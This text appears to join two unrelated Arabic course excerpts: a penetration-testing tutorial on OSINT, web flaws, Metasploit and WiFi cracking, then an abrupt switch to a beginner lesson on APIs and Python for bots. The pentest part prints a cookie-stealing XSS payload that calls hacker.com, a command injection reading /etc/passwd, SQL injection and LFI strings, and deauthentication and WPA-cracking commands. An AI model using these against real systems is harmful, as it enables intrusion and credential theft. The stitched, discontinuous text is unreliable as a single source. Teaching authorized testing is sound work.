يخترق بدون إذن لكن دون نية إجرامية واضحة. أحياناً يبلغ المالك بعد الاختراق. رغم نواياه الجيدة فما يفعله غير قانوني وقد يُلاحَق قضائياً.

ثانياً: ما الذي يفعله مختبر الاختراق تحديداً؟

مختبر الاختراق يؤدي دور المهاجم بشكل مسيطر عليه ومصرح به. يُحاكي الهجمات الحقيقية على نظام الشركة لكن بهدف الكشف لا التدمير.

الشركات تدفع مبالغ كبيرة لمختبري الاختراق لأن السبب بسيط جداً: أفضل أن تجد الثغرة أنت قبل أن يجدها مهاجم حقيقي. تكلفة اختبار الاختراق أقل بكثير من تكلفة الاختراق الحقيقي.

أنواع اختبارات الاختراق:

اختبار الشبكات Network Penetration Testing:

فحص الشبكة الداخلية والخارجية للشركة وإيجاد الأجهزة المكشوفة والخدمات الضعيفة والثغرات في الإعدادات.

اختبار تطبيقات الويب Web Application Penetration Testing:

فحص المواقع والتطبيقات للبحث عن ثغرات مثل SQL Injection وXSS وCSRF وغيرها من الثغرات الشائعة.

اختبار التطبيقات Mobile Application Testing:

فحص تطبيقات الهواتف للبحث عن ثغرات في الكود أو في طريقة التواصل مع السيرفر.

الهندسة الاجتماعية Social Engineering:

اختبار مدى وعي الموظفين بالأمن. هل يمكن خداعهم للكشف عن كلمات مرورهم؟ هل يفتحون روابط مشبوهة؟

الاختراق المادي Physical Penetration Testing:

محاولة الدخول الفعلي لمبنى الشركة، واختبار الحراسة وكاميرات المراقبة والبطاقات الأمنية.

ثالثاً: منهجية PTES - الإطار الاحترافي

PTES تعني Penetration Testing Execution Standard وهي المعيار الدولي لاختبار الاختراق. كل اختبار احترافي يسير وفق هذه المراحل بالترتيب.

المرحلة الأولى: التخطيط المسبق Pre-Engagement

قبل أي شيء يجب توضيح وتوثيق كل شيء مع العميل:

  • ما الأنظمة التي سيتم اختبارها تحديداً؟ وما الذي لن يُختبر؟
  • ما الأساليب المسموح بها وما الممنوع منها؟
  • ما الفترة الزمنية للاختبار؟
  • من يتم إخطاره إذا اكتُشف اختراق حقيقي أثناء الاختبار؟
  • ما مستوى السرية المطلوب للتقرير؟

كل هذا يوضع في عقد قانوني موقع قبل بدء أي عمل.

  • جمع معلومات من الإنترنت المفتوح عن الشركة والموظفين والأنظمة
  • استكشاف البنية التحتية للشبكة
  • تحديد التقنيات المستخدمة وإصداراتها
  • إيجاد عناوين البريد الإلكتروني وأسماء الموظفين

المرحلة الثالثة: تحديد التهديدات Threat Modeling

بعد جمع المعلومات، يحدد المختبر ما هي أخطر التهديدات المحتملة على هذا النظام تحديداً. ليس كل نظام عرضة لنفس الهجمات.

المرحلة الرابعة: تحليل الثغرات Vulnerability Analysis

البحث المنظم عن الثغرات في الأنظمة المستهدفة. يشمل:

  • فحص الـ Ports والخدمات
  • البحث عن إصدارات قديمة
  • فحص الإعدادات الخاطئة
  • مقارنة النتائج بقواعد بيانات الثغرات المعروفة

المرحلة الخامسة: الاستغلال Exploitation

محاولة استغلال الثغرات المكتشفة. الهدف إثبات إمكانية الاستغلال الفعلي وليس مجرد وجود الثغرة على الورق.

المرحلة السادسة: ما بعد الاستغلال Post-Exploitation

بعد الدخول، يحاول المختبر فهم حجم الضرر المحتمل. ماذا يمكن للمهاجم أن يصل إليه؟ هل يمكن الانتشار لأجهزة أخرى في الشبكة؟ ما البيانات الحساسة المتاحة؟

المرحلة السابعة: التقرير Reporting

التوثيق الاحترافي لكل ما تم اكتشافه مع التوصيات التفصيلية للإصلاح. هذه المرحلة بالغة الأهمية لأنها المنتج الفعلي الذي يدفع العميل مقابله.

رابعاً: أنواع اختبارات الاختراق حسب المعلومات المتاحة

Black Box Testing:

المختبر لا يعرف أي شيء عن النظام. يبدأ من الصفر تماماً مثل مهاجم خارجي حقيقي.

White Box Testing:

المختبر يملك معلومات كاملة عن النظام مثل الكود المصدري ومخططات الشبكة وبيانات الدخول. يتيح اختباراً أعمق وأشمل.

Gray Box Testing:

المختبر يملك معلومات جزئية مثل حساب مستخدم عادي. يحاكي سيناريو موظف ساخط أو حساب مسروق.

الدرس الثاني: جمع المعلومات - OSINT والاستكشاف

ماذا ستتعلم في هذا الدرس؟

ستتعلم في هذا الدرس كيف يجمع المحترفون معلومات شاملة عن هدف ما قبل أي هجوم أو اختبار. هذه المرحلة تسمى OSINT وهي اختصار Open Source Intelligence أي الاستخبارات من المصادر المفتوحة. ستتفاجأ بحجم المعلومات المتاحة عن أي شركة أو شخص على الإنترنت.

أولاً: لماذا جمع المعلومات أهم من الاختراق نفسه؟

كثير من المبتدئين يريدون القفز مباشرة لاستخدام الأدوات والاختراق. هذا أسلوب الهواة. المحترف يقضي أحياناً 60 إلى 70 بالمئة من وقت اختبار الاختراق في جمع المعلومات فقط.

السبب بسيط: كلما عرفت أكثر عن هدفك، كلما:

  • وجدت الثغرات أسرع
  • قللت الضوضاء والأثر الذي تتركه
  • ركزت جهودك على نقاط الضعف الفعلية
  • أنتجت تقريراً أكثر عمقاً وقيمة

ثانياً: OSINT - الاستخبارات من المصادر المفتوحة

OSINT يعني جمع المعلومات من مصادر متاحة للعموم بدون أي تقنيات هجوم. كل ما تفعله قانوني تماماً لأنك تقرأ ما هو منشور للعموم.

ما الذي تبحث عنه؟

عن الشركة:

  • نطاق الموقع وعناوين IP المرتبطة به
  • البريد الإلكتروني للموظفين وهيكل تنسيق العناوين (مثل اسم.نسب@شركة.com)
  • التقنيات المستخدمة في الموقع والسيرفر
  • وظائف الشركة المعلنة (تكشف التقنيات التي يستخدمونها)
  • الفروع والشركات التابعة

عن الأشخاص:

  • أسماء المديرين والمسؤولين التقنيين
  • حساباتهم على LinkedIn وGitHub وغيرها
  • المعلومات المسربة في اختراقات سابقة

ثالثاً: أدوات OSINT الأساسية

Google Dorks - البحث المتقدم في Google:

Google Dorks هي طريقة استخدام Google بشكل متقدم للبحث عن معلومات محددة جداً. معظم الناس لا يعرف أن Google يمكنه إيجاد هذه المعلومات.

code
site:شركة.com                    البحث داخل موقع محدد فقط
site:شركة.com filetype:pdf      البحث عن ملفات PDF في الموقع
site:شركة.com inurl:admin       البحث عن صفحات admin
site:شركة.com intitle:login     البحث عن صفحات تسجيل دخول
"@شركة.com" site:linkedin.com   إيجاد موظفين الشركة على LinkedIn

مثال عملي:

code
site:github.com "شركة.com" password

هذا يبحث عن كلمات مرور لشركة ما مرفوعة بالخطأ على GitHub. وأنت مندهش كم من المطورين يرفعون كلمات مرور وبيانات حساسة على GitHub عن طريق الخطأ.

Shodan - محرك بحث الأجهزة المتصلة:

Shodan هو محرك بحث غير عادي. بدلاً من فهرسة المواقع، يفهرس الأجهزة المتصلة بالإنترنت. كل كاميرا مراقبة، كل طابعة، كل سيرفر، كل جهاز إنترنت الأشياء.

الموقع: shodan.io

ماذا يمكنك أن تجد؟

  • خوادم الويب مع إصداراتها
  • كاميرات مراقبة مكشوفة للعموم
  • أجهزة صناعية وبنية تحتية
  • قواعد البيانات المكشوفة بدون كلمة مرور

عمليات بحث مهمة على Shodan:

code
org:"اسم الشركة"           البحث عن أجهزة تابعة لشركة محددة
hostname:شركة.com          البحث حسب اسم النطاق
port:22 country:SA         البحث عن خوادم SSH في السعودية
product:"Apache httpd"     البحث عن خوادم Apache

theHarvester - جمع الإيميلات والنطاقات:

أداة مدمجة في Kali Linux تجمع تلقائياً عناوين البريد الإلكتروني وأسماء النطاقات وعناوين IP من مصادر متعددة.

code
theHarvester -d شركة.com -b google
theHarvester -d شركة.com -b all

Maltego - رسم خرائط العلاقات:

أداة رسومية تحوّل معلومات OSINT إلى خريطة بصرية تظهر العلاقات بين الكيانات. مثلاً تريك كيف ترتبط عناوين IP بالنطاقات بالشركات بالأشخاص.

WHOIS - معلومات تسجيل النطاق:

code

يعطيك معلومات تسجيل النطاق مثل اسم المالك وعنوانه وبريده الإلكتروني وتواريخ التسجيل والانتهاء وخوادم DNS.

Recon-ng - إطار OSINT متكامل:

إطار مشابه لـ Metasploit لكن مخصص لجمع المعلومات. يحتوي على وحدات كثيرة لمصادر مختلفة.

code
recon-ng
[recon-ng] > marketplace search
[recon-ng] > marketplace install recon/domains-hosts/google_site_web
[recon-ng] > modules load recon/domains-hosts/google_site_web
[recon-ng] > options set SOURCE شركة.com
[recon-ng] > run

الدرس الثالث: استغلال الثغرات - من الاكتشاف إلى الاختراق

ماذا ستتعلم في هذا الدرس؟

ستتعلم في هذا الدرس كيف يتحرك المختبر من اكتشاف الثغرة إلى استغلالها الفعلي. ستفهم أنواع الثغرات الأكثر شيوعاً وكيف تعمل وكيف تُستغل، وكيف يساعدك Claude في فهم كل خطوة.

أولاً: قاعدة بيانات الثغرات CVE

CVE تعني Common Vulnerabilities and Exposures. هو نظام عالمي لتسمية الثغرات الأمنية المكتشفة. كل ثغرة تُكتشف تُعطى رقماً فريداً مثل CVE-2021-44228.

لماذا هذا مهم؟

عندما تكتشف أن سيرفراً يعمل بإصدار قديم من برنامج ما، تبحث عن CVE لذلك الإصدار وتجد الثغرات المعروفة وأدوات استغلالها.

أهم المواقع:

  • nvd.nist.gov: قاعدة بيانات الثغرات الوطنية الأمريكية
  • cve.mitre.org: قاعدة CVE الرسمية
  • exploit-db.com: قاعدة بيانات الـ Exploits الجاهزة

CVSS - نظام تصنيف خطورة الثغرات:

كل ثغرة تأخذ درجة من 0 إلى 10:

  • 9 إلى 10: خطيرة جداً - Critical
  • 7 إلى 8.9: عالية - High
  • 4 إلى 6.9: متوسطة - Medium
  • 0.1 إلى 3.9: منخفضة - Low

ثانياً: أهم أنواع الثغرات

Buffer Overflow:

تخيل كوباً ماء. إذا صببت ماء أكثر من سعته، سيفيض للخارج. Buffer Overflow مشابه تماماً.

عندما يستقبل برنامج بيانات أكبر مما خصصه في الذاكرة، تفيض البيانات لمناطق أخرى في الذاكرة. مهاجم متقدم يمكنه التحكم في هذه البيانات الفائضة لتنفيذ أكوادٍ خبيثة.

هذا النوع من الثغرات موجود في برامج C وC++ القديمة.

SQL Injection:

عندما يُدخل المستخدم بيانات في نموذج موقع ويب، يجب أن يُنظّف الكود هذه البيانات قبل استخدامها في استعلامات قاعدة البيانات. إذا لم يحدث ذلك، يمكن للمهاجم إدخال كود SQL مباشرة وتنفيذه على قاعدة البيانات.

مثال على استعلام عادي:

code
SELECT * FROM users WHERE username='ahmed' AND password='1234';

مثال على SQL Injection:

code
SELECT * FROM users WHERE username='ahmed' OR '1'='1' --' AND password='';

الجزء المُدخل: ahmed&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --

الشرط &#x27;1&#x27;=&#x27;1&#x27; دائماً صحيح، والـ -- يعلّق بقية الاستعلام. النتيجة: يسجل الدخول بدون كلمة مرور.

Cross-Site Scripting XSS:

ثغرة تسمح بحقن JavaScript ضار في صفحة ويب. عندما يزور مستخدمون آخرون الصفحة، ينفذ المتصفح هذا الكود في سياق الموقع.

يستخدم لـ: سرقة ملفات تعريف الارتباط Cookies، اعتراض جلسات المستخدمين، إعادة توجيههم لمواقع مزيفة.

مثال:

code
<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>

إذا قبل الموقع هذا النص وعرضه للمستخدمين الآخرين، يُرسل كل زائر ملفات تعريف الارتباط الخاصة به للمهاجم.

Command Injection:

شبيه بـ SQL Injection لكن بدلاً من حقن كود SQL يتم حقن أوامر نظام التشغيل.

مثال: موقع يقبل عنوان IP ويُنفذ أمر ping عليه:

code
ping 192.168.1.1; cat /etc/passwd

الجزء المُضاف: ; cat /etc/passwd ينفذ أمراً إضافياً يعرض ملف كلمات المرور.

File Inclusion:

ثغرة تسمح للمهاجم بتضمين ملفات خارجية في تطبيق الويب.

LFI - Local File Inclusion: تضمين ملفات من الخادم نفسه:

code
page=../../../../etc/passwd

RFI - Remote File Inclusion: تضمين ملفات من خادم خارجي تحت سيطرة المهاجم.

ثالثاً: Metasploit بالتفصيل

تعلمت مقدمة عن Metasploit في المسار السابق. الآن نتعمق أكثر.

هيكل Metasploit:

code
/usr/share/metasploit-framework/
modules/
    exploits/        الـ Exploits مصنفة حسب نظام التشغيل والتطبيق
    payloads/        الـ Payloads التي تُنفذ بعد الاستغلال
    auxiliary/       أدوات مساعدة للفحص والاستكشاف
    post/            أدوات ما بعد الاستغلال
    encoders/        لتشفير الـ Payloads وتجاوز مكافحة الفيروسات

أنواع الـ Payloads:

Single: كود صغير ينفذ مهمة واحدة ثم ينتهي.

Staged: يُرسل في مرحلتين. المرحلة الأولى صغيرة جداً تتصل بالمهاجم وتُحمّل الكود الرئيسي.

Meterpreter: الـ Payload الأقوى. يعمل في الذاكرة مباشرة دون ترك ملفات على القرص. يعطيك تحكماً كاملاً في الجهاز.

أوامر Meterpreter الأساسية:

code
sysinfo              معلومات النظام
getuid               معرفة المستخدم الحالي
getpid               رقم العملية الحالية
shell                الوصول لـ shell النظام
upload ملف           رفع ملف للجهاز المخترق
download ملف         تحميل ملف من الجهاز المخترق

بعد السيطرة على جهاز واحد، يحاول المهاجم الانتشار لأجهزة أخرى في الشبكة. هذا يسمى Lateral Movement.

Pivoting:

الدرس الرابع: اختبار أمان تطبيقات الويب

ماذا ستتعلم في هذا الدرس؟

اختبار تطبيقات الويب هو التخصص الأكثر طلباً في الأمن السيبراني. معظم الشركات لديها مواقع وتطبيقات ويب وتحتاج لاختبارها باستمرار. ستتعلم في هذا الدرس الأدوات والتقنيات الأساسية لهذا التخصص.

أولاً: OWASP Top 10 - أخطر ثغرات الويب

OWASP هي منظمة غير ربحية تُصدر قائمة سنوية بأخطر عشر ثغرات في تطبيقات الويب. هذه القائمة هي المرجع الأساسي لكل مختبر اختراق ويب.

A01 - Broken Access Control:

المستخدم يستطيع الوصول لموارد أو وظائف ليس مخولاً بها. مثال: مستخدم عادي يستطيع الوصول لصفحة الإدارة بتغيير الرابط من /user إلى /admin.

A02 - Cryptographic Failures:

استخدام خوارزميات تشفير ضعيفة أو قديمة أو تخزين كلمات المرور بدون تشفير. مثال: تخزين كلمات المرور كنص واضح في قاعدة البيانات.

A03 - Injection:

SQL Injection وCommand Injection وغيرها كما تعلمنا.

A04 - Insecure Design:

عيوب في تصميم التطبيق نفسه وليس في التطبيق. مثال: تطبيق لا يطلب التحقق من الإيميل عند التسجيل.

A05 - Security Misconfiguration:

إعدادات أمنية خاطئة مثل ترك الإعدادات الافتراضية أو تفعيل ميزات غير ضرورية.

A06 - Vulnerable and Outdated Components:

استخدام مكتبات وإطارات عمل قديمة فيها ثغرات معروفة.

A07 - Identification and Authentication Failures:

ضعف في آليات المصادقة مثل السماح بكلمات مرور ضعيفة أو عدم تفعيل المصادقة الثنائية.

A08 - Software and Data Integrity Failures:

عدم التحقق من سلامة البيانات والكود المستخدم.

A09 - Security Logging and Monitoring Failures:

عدم تسجيل الأحداث الأمنية أو عدم مراقبتها، مما يجعل اكتشاف الاختراقات متأخراً.

A10 - Server-Side Request Forgery SSRF:

ثغرة تسمح للمهاجم بإجبار السيرفر على إرسال طلبات لعناوين داخلية لا يمكن الوصول إليها مباشرة.

ثانياً: Burp Suite - الأداة الأساسية لاختبار الويب

Burp Suite هو الأداة المرجعية لاختبار أمان تطبيقات الويب. يستخدمه كل مختبري الاختراق المحترفين.

كيف يعمل؟

يعمل Burp Suite كـ Proxy أي وسيط بين متصفحك والسيرفر. كل طلب ترسله يمر عبره ويمكنك رؤيته وتعديله.

تثبيت وإعداد Burp Suite:

على Kali Linux مثبت مسبقاً. افتحه من:

Applications > Web Application Analysis > burpsuite

لإعداد المتصفح ليستخدم Burp كـ Proxy:

  • اذهب لإعدادات المتصفح
  • الشبكة والـ Proxy
  • اضبط HTTP Proxy على 127.0.0.1 والـ Port على 8080

أهم مميزات Burp Suite:

Intercept: يوقف الطلبات ويسمح لك بتعديلها قبل إرسالها للسيرفر.

Repeater: يسمح بإرسال طلبات وتعديلها وإعادة إرسالها مراراً. مفيد جداً عند اختبار الثغرات.

Intruder: يُؤتمت هجمات مثل Brute Force وFuzzing.

Scanner: يفحص التطبيق تلقائياً ويكتشف الثغرات (متاح في النسخة المدفوعة).

Decoder: يُشفر ويفك تشفير البيانات بصيغ مختلفة مثل Base64 وURL Encoding.

الدرس الخامس: اختبار أمان الشبكات اللاسلكية WiFi

ماذا ستتعلم في هذا الدرس؟

الشبكات اللاسلكية هدف شائع للمهاجمين لأنها تُبث في الهواء ويمكن التقاطها من أي مكان ضمن نطاقها. ستتعلم في هذا الدرس كيف تختبر أمان شبكات WiFi بشكل احترافي.

تنبيه: اختبر شبكتك المنزلية فقط أو شبكات حصلت على إذن صريح لاختبارها.

أولاً: كيف تعمل شبكات WiFi؟

نقطة الوصول Access Point تبث إشارة لاسلكية. الأجهزة ترسل وتستقبل البيانات عبر هذه الإشارة. المصادقة تتم بكلمة مرور أو بشهادات رقمية.

بروتوكولات الأمان:

WEP: أقدم بروتوكول وأضعفه. يمكن كسره في دقائق. لا يستخدم الآن إلا في الأجهزة القديمة جداً.

WPA: أفضل من WEP لكن لا يزال ضعيفاً.

WPA2: الأكثر انتشاراً حالياً. آمن بشكل معقول إذا استُخدمت كلمة مرور قوية.

WPA3: الأحدث والأأمن. يحمي ضد هجمات Offline Dictionary.

ثانياً: Aircrack-ng Suite

Aircrack-ng مجموعة أدوات متكاملة لاختبار أمان WiFi.

الأدوات الرئيسية:

airmon-ng: لتفعيل وضع المراقبة على بطاقة الشبكة اللاسلكية.

airodump-ng: لالتقاط حزم البيانات اللاسلكية.

aireplay-ng: لحقن حزم بيانات اصطناعية.

aircrack-ng: لكسر مفاتيح WEP/WPA.

ثالثاً: الخطوات العملية لاختبار WPA2

الخطوة الأولى: تفعيل وضع المراقبة

code
# معرفة اسم بطاقة الشبكة اللاسلكية
iwconfig

# إيقاف العمليات التي قد تتداخل
airmon-ng check kill

# تفعيل وضع المراقبة
airmon-ng start wlan0

بعد هذا يصبح اسم البطاقة wlan0mon.

الخطوة الثانية: مسح الشبكات المحيطة

code
airodump-ng wlan0mon

ستجد قائمة بالشبكات المحيطة مع معلوماتها:

  • BSSID: عنوان MAC لنقطة الوصول
  • CH: القناة
  • ENC: نوع التشفير
  • ESSID: اسم الشبكة

الخطوة الثالثة: التركيز على الشبكة الهدف

code
airodump-ng -c [رقم_القناة] --bssid [BSSID] -w capture wlan0mon

هذا يلتقط حزم البيانات من الشبكة المحددة ويحفظها في ملف.

الخطوة الرابعة: التقاط WPA Handshake

WPA Handshake هو تبادل بيانات المصادقة عند اتصال جهاز بالشبكة. يحتوي على معلومات كافية لمحاولة كسر كلمة المرور دون الاتصال بالشبكة.

يمكن انتظار اتصال جهاز جديد، أو إجبار جهاز متصل على إعادة الاتصال:

code
aireplay-ng -0 10 -a [BSSID] -c [عنوان_MAC_للعميل] wlan0mon

-0 يعني إرسال Deauthentication Frames لإجبار الجهاز على قطع الاتصال وإعادة الاتصال.

عندما تلتقط الـ Handshake سيظهر في الزاوية العليا اليمنى: WPA handshake: [BSSID]

الخطوة الخامسة: محاولة كسر كلمة المرور

code
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

هذا يجرب كل كلمة في قائمة rockyou.txt كلمة مرور محتملة.

لماذا نجاح هذا يعتمد على كلمة المرور؟

إذا كانت كلمة المرور موجودة في قائمة الكلمات ستُكسر بسرعة. إذا كانت معقدة وغير موجودة في القوائم المعروفة، لن تُكسر. هذا يُثبت للعميل أهمية استخدام كلمات مرور قوية وعشوائية.

رابعاً: Hashcat - كسر كلمات المرور بقوة أكبر

Hashcat أسرع بكثير من Aircrack لأنه يستخدم بطاقة الرسومات GPU.

code
# تحويل الـ Handshake لصيغة hashcat
hcxpcapngtool -o hash.hc22000 capture-01.cap

# كسر بقائمة كلمات
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# كسر بهجوم القواعد
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# كسر بـ Brute Force مع قناع محدد
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

?d تعني رقم. ?d×8 تعني ثمانية أرقام. هذا يجرب كل الأرقام من 00000000 إلى 99999999.

خامساً: Evil Twin Attack

هجوم التوأم الشرير هو إنشاء نقطة وصول وهمية بنفس اسم شبكة حقيقية. الأجهزة القريبة قد تتصل بها تلقائياً ظناً أنها الشبكة الحقيقية.

هذا الهجوم يُستخدم في اختبارات الاختراق لاختبار وعي الموظفين وجاهزية الشبكة.

اسأل Claude:

"اشرح لي كيف يعمل Evil Twin Attack بالتفصيل وكيف يمكن لمسؤول الشبكة اكتشافه والحماية منه."

الدرس السادس: التقرير الاحترافي ومسارك المهني

ماذا ستتعلم في هذا الدرس؟

في هذا الدرس الأخير ستتعلم أهم مهارة يفتقدها معظم مختبري الاختراق المبتدئين: كتابة التقرير الاحترافي. ستتعلم أيضاً كيف تبني مسيرة مهنية ناجحة في هذا المجال.

أولاً: لماذا التقرير هو المنتج الأساسي؟

مختبر الاختراق يبيع المعرفة والخبرة على شكل تقرير. الشركة لا ترى ما تفعله، ترى فقط ما توثقه. تقرير ممتاز يجعلك تُعاد توظيفك باستمرار. تقرير ضعيف يقلل قيمتك مهما كانت مهاراتك التقنية.

ثانياً: هيكل التقرير الاحترافي

صفحة الغلاف:

تحتوي على اسم المشروع، اسم العميل، تاريخ التقرير، درجة سرية المستند، اسم الشركة المنفذة.

جدول المحتويات:

فهرس تفصيلي لكل أقسام التقرير.

الملخص التنفيذي:

هذا القسم مُوجَّه للإدارة العليا التي ليس لديها خلفية تقنية. يجب أن يكون:

  • قصيراً لا يتجاوز صفحتين
  • خالياً من المصطلحات التقنية المعقدة
  • يُبيّن بوضوح مستوى الخطر العام
  • يُلخص أهم النتائج وأولويات الإصلاح

مثال:

"أجرى الفريق اختبار اختراق شامل على البنية التحتية لشركة X خلال الفترة من ... إلى ... تضمن الاختبار الشبكة الداخلية والخارجية وتطبيق الويب الرئيسي. تم اكتشاف 15 ثغرة أمنية منها 3 بمستوى خطورة حرج. الثغرات الحرجة تتيح للمهاجم الحصول على صلاحيات إدارية كاملة على السيرفرات. يوصي الفريق بمعالجة هذه الثغرات فورياً قبل أي شيء آخر."

نطاق الاختبار:

يحدد بدقة:

  • ما الأنظمة التي تم اختبارها بعناوين IP والنطاقات
  • ما الأنظمة التي استُثنيت من الاختبار
  • الفترة الزمنية للاختبار
  • نوع الاختبار (Black Box / White Box / Gray Box)

الدرس الأول: كيف يعمل الإنترنت والـ API

ما هو الـ API، كيف يتكلم البوت مع المواقع، وما هي الطلبات والردود

أولاً: ما هو البوت أصلاً؟

قبل أي شيء، يجب أن تفهم ما الذي تبنيه. البوت هو برنامج يعمل تلقائياً بدون تدخل بشري. يعني بدل ما أنت تفتح موقعاً وتضغط أزراراً وتقرأ معلومات — البوت يفعل هذا كله وحده بسرعة هائلة.

أمثلة على البوتات التي تستخدمها كل يوم بدون أن تعرف:

البوت ماذا يفعل؟
بوت Telegram يرد على رسائلك تلقائياً، يرسل لك أخباراً، ينظم مجموعات
بوت Google يجوب الإنترنت كل يوم ويقرأ ملايين الصفحات ويخزّنها
بوت تنبيهات الأسعار يراقب سعر منتج في Amazon ويرسل لك إشعاراً لما ينخفض
بوت الردود التلقائية يرد على تعليقات Instagram أو رسائل WhatsApp بشكل تلقائي

ثانياً: كيف يتواصل البوت مع الإنترنت؟

أنت عندما تفتح موقعاً، المتصفح يرسل طلباً للخادم والخادم يردّ بصفحة HTML تراها. البوت يفعل نفس الشيء بالضبط — لكن بدل ما يعرض الصفحة، يقرأ البيانات مباشرة ويعمل بها.

هناك طريقتان يتواصل بهما البوت مع الإنترنت:

  • Web Scraping — قراءة الصفحة مباشرة: البوت يفتح صفحة HTML ويقرأ محتواها مثل ما يفعل المتصفح، لكن بدل ما يعرضها يستخرج منها البيانات التي يريدها. مثال: بوت يقرأ أسعار البنزين من موقع حكومي كل ساعة.
  • API — الطريق الرسمي المرتّب: بعض المواقع توفر بوابة رسمية تعطيك البيانات مرتّبة ونظيفة بدون ما تحتاج تقرأ HTML. هذه البوابة تسمى API. وهذا ما سنشرحه بالتفصيل.

ثالثاً: ما هو الـ API؟ — الشرح الكامل

كلمة API اختصار لـ Application Programming Interface. بالعربي: واجهة برمجة التطبيقات. لكن هذا الاسم معقد، فلنفهمه بمثال بسيط جداً.

تخيّل أنك في مطعم. أنت لا تدخل للمطبخ وتطبخ بنفسك — بدل ذلك تطلب من النادل. النادل يأخذ طلبك للمطبخ ويرجع لك بالأكل.

في عالم البرمجة: أنت = البوت، النادل = الـ API، المطبخ = الخادم. الـ API هو الوسيط الذي يأخذ طلبك ويجيبك بالبيانات.

مثال حقيقي: تطبيق الطقس في هاتفك لا يملك أجهزة أرصاد جوية. يرسل طلباً لـ API طقس مثل OpenWeatherMap ويقول: "أعطني درجة الحرارة في نواكشوط الآن". الـ API يردّ بالبيانات، والتطبيق يعرضها لك.

رابعاً: كيف يبدو الطلب والرد في الـ API؟

الـ API يعمل عبر HTTP — نفس البروتوكول الذي يعمل به الإنترنت. البوت يرسل طلباً لعنوان محدد يسمى Endpoint، والـ API يردّ بالبيانات بصيغة تسمى JSON.

مثال: طلب معلومات عن الطقس

الطلب الذي يرسله البوت — HTTP Request
HTTP
GET https://api.weather.com/v1/current?city=Nouakchott&key=ABC123

هذا الطلب يقول: "أعطني (GET) الطقس الحالي للمدينة نواكشوط." الـ key هو مفتاح سري يثبت أنك أنت من يطلب — مثل بطاقة الهوية.

الرد الذي يستقبله البوت — JSON Response
JSON
{
  "city": "Nouakchott",
  "temperature": 38,
  "unit": "celsius",
  "condition": "sunny",
  "humidity": 24,
  "wind_speed": 15
}

هذا هو JSON — صيغة بسيطة لتنظيم البيانات على شكل أزواج: اسم المعلومة وقيمتها. البوت يقرأ هذا الرد ويستخرج منه ما يريد. مثلاً يقرأ قيمة temperature ويرسلها لك على Telegram.

خامساً: أنواع طلبات HTTP التي يستخدمها البوت

نوع الطلب ماذا يفعل؟ مثال
GET يطلب بيانات فقط — لا يغير شيئاً اجلب لي قائمة المنتجات
POST يرسل بيانات جديدة للخادم أرسل رسالة، أنشئ حساباً
PUT يعدّل بيانات موجودة غيّر اسم المستخدم
DELETE يحذف بيانات احذف هذا المنشور

معظم بوتاتك ستستخدم GET لجلب المعلومات وPOST لإرسالها.

سادساً: أمثلة على APIs مشهورة ستستخدمها

الـ API ماذا يفعل؟ يستخدم في بوتات
Telegram Bot API يرسل ويستقبل رسائل Telegram بوتات التشات والتنبيهات
OpenAI API يتواصل مع ChatGPT بوتات الذكاء الاصطناعي
WhatsApp Business API يرسل ويستقبل رسائل WhatsApp بوتات خدمة العملاء
Twitter/X API يقرأ وينشر تغريدات بوتات النشر التلقائي
Currency API يعطيك أسعار العملات لحظياً بوتات تتبع الأسعار

خلاصة الدرس

  • البوت برنامج يعمل تلقائياً بدون تدخل بشري
  • البوت يتواصل مع الإنترنت إما بقراءة HTML مباشرة أو عبر API
  • الـ API هو بوابة رسمية تعطيك البيانات منظمة ونظيفة
  • البوت يرسل طلب HTTP لعنوان Endpoint والـ API يردّ بصيغة JSON
  • أنواع الطلبات: GET للجلب، POST للإرسال، PUT للتعديل، DELETE للحذف
  • Telegram وOpenAI وWhatsApp كلها توفر APIs يمكن بناء بوتات عليها

المتغيرات، الشروط، الحلقات، الدوال — كل شيء بأمثلة حية تعمل فعلاً

أولاً: لماذا Python تحديداً؟

هناك عشرات لغات البرمجة في العالم. لماذا نختار Python لبناء البوتات؟

السبب الشرح

مكتبات جاهزة لكل شيء في Python مكتبة لإرسال طلبات HTTP، ومكتبة لـ Telegram، ومكتبة للذكاء الاصطناعي — كلها بسطرين

ثانياً: المتغيرات — صناديق لحفظ البيانات

المتغير هو صندوق في ذاكرة الحاسوب تضع فيه بياناً وتعطيه اسماً حتى تستخدمه لاحقاً. في Python لا تحتاج تقول "أنشئ صندوقاً" — فقط اكتب الاسم ثم = ثم القيمة.

# نص — يوضع بين علامات اقتباس
اسم = "محمد"

# أرقام — بدون علامات اقتباس

رصيد = 150.75

# صح أو خطأ (True أو False فقط)
مشترك = True

# طباعة قيمة المتغير على الشاشة

print("مرحباً", اسم, "عمرك", عمر)

في البوت مثلاً: تحفظ رقم المستخدم في متغير، تحفظ رسالته في متغير، ثم تعمل بهما.

ثالثاً: الشروط — البوت يفكر ويقرر

الشرط يقول للبرنامج: "إذا كان كذا، افعل كذا. وإلا افعل كذا آخر." هذا ما يجعل البوت يتصرف بذكاء بدل ما يكرر نفس الشيء دائماً.

Python
# مثال: بوت يرد بناءً على الرسالة
رسالة = "مرحبا"

if رسالة == "مرحبا":
    print("أهلاً! كيف أساعدك؟")
elif رسالة == "الأسعار":
    print("الاشتراك الشهري 10 دولار")
else:
    print("لم أفهم طلبك، حاول مرة أخرى")
// النتيجة (لأن رسالة = "مرحبا")
أهلاً! كيف أساعدك؟

if تعني "إذا"، elif تعني "وإلا إذا"، else تعني "وإلا". لاحظ المسافة قبل print — هذه مهمة جداً في Python، تسمى Indentation وتعني أن هذا السطر تابع للشرط فوقه.

رابعاً: الحلقات — البوت يكرر بدون تعب

الحلقة تأمر البرنامج بتكرار شيء عدة مرات. بدلاً من أن تكتب نفس السطر مئة مرة، تكتبه مرة داخل حلقة وتقول له كرره مئة مرة.

حلقة for — كرر لكل عنصر في قائمة

Python
# قائمة مستخدمين سنرسل لهم إشعاراً
مستخدمون = ["أحمد", "فاطمة", "خالد", "مريم"]

for مستخدم in مستخدمون:
    print("تم إرسال إشعار لـ", مستخدم)
// النتيجة

تم إرسال إشعار لـ فاطمة
تم إرسال إشعار لـ خالد
تم إرسال إشعار لـ مريم

حلقة while — كرر طالما الشرط صحيح

Python
# البوت يظل يستقبل رسائل حتى يقول المستخدم "خروج"
يعمل = True

while يعمل:
    رسالة = input("اكتب رسالتك: ")
